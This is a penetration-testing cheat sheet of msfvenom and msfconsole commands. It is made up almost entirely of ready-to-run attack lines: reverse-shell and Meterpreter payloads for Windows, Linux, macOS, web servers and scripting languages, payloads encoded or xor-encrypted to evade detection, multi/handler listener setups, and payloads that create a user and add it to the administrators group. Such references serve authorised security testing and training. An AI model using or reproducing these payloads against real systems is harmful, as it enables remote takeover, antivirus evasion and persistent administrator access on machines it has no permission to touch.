# msfvenom

% msfvenom, reverse shell

#plateform/linux #target/local #cat/ATTACK/REVERSE_SHELL 

## msfvenom payloads list
```
msfvenom --list payloads
```
# msfvenom format list
```
msfvenom --list formats
```

## msfvenom - payload windows x86 meterpeter unstagged
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe
```

## Linux Meterpreter Reverse Shell
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > shell.elf
```

## Linux x64 Meterpreter Reverse tcp
```
msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
```

## Windows Meterpreter Reverse TCP Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe
```

## Windows Reverse TCP Shell
```
msfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe
```

## Windows Encoded Meterpreter Windows Reverse Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

## Mac Reverse Shell
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f macho > shell.macho
```

## meterpreter x64 - https - non staged
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o /var/www/html/msfnonstaged.exe
```

## meterpreter x64 - https - staged
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o /var/www/html/msfstaged.exe
```

## Web Payloads

## PHP Meterpreter Reverse TCP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php
```

## ASP Meterpreter Reverse TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp > shell.asp
```

## JSP Java Meterpreter Reverse TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.jsp
```

## WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war
```

## VBA 32bits
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f vbapplication
```

## powershell 32 bits
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f ps1
```

## DLL
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f dll -o <dll|output.dll>
```

# Scripting Payloads

## Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.py
```

## Bash Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.sh
```

## Perl Unix Reverse shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.pl
```

## Powershell
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f ps1
```

## Csharp - xor encrypted
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> --encrypt xor --encrypt-key <key> -f csharp
```

# msfvenom Shellcode

## Windows Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f <language>
```

## Linux Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f <language>
```

## Mac Reverse TCP Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f <language>
```

# msfvenom create user 

## MCreate User
```
msfvenom -p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe > adduser.exe
```

# msfvenom Handler

## Metasploit Handler windows tcp 32bits staged
```
msfconsole -x 'use exploits/multi/handler; set lhost <IP>; set lport <PORT>; set payload windows/meterpreter/reverse_tcp; exploit'
```

## Metasploit Handler windows https 32bits staged
```
msfconsole -x 'use exploits/multi/handler; set lhost <IP>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit
```

## Metasploit Handler windows https 64bits staged
```
msfconsole -x 'use exploits/multi/handler; set lhost <IP>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; exploit'
```

## Metasploit - Handler windows https 64bits unstaged
```
msfconsole -x 'use exploits/multi/handler; set lhost <IP>; set lport <port|443>; set payload windows/x64/meterpreter_reverse_https; exploit'
```

## Metasploit - Handler windows https 64bits stagged - encoded xor
others encoder : x64/zutto_dekiru

```
msfconsole -x 'use exploits/multi/handler; set lhost <IP>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit'
```

## Metasploit - Handler linux tcp 64bits stagged - encoded xor
```
msfconsole -x 'use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit'
```

## Metasploit - Windows add user
```
msfvenom -p windows/adduser USER=<USER> PASS=<PASSWORD> -f <format> -o <FILE>
```
## Metasploit - Windows Exec
```
msfvenom -p windows/exec CMD='<COMMAND>' -f <format> -o <FILE>
```

## Metasploit - add user and add to admin group
#plateform/windows #target/local
msfvenom payload to add user and add to admin group  
```
msfvenom -p windows/exec CMD='net user <USER> <PASSWORD> /add && net localgroup administrators <USER> /add' -f <format> -o <FILE>
```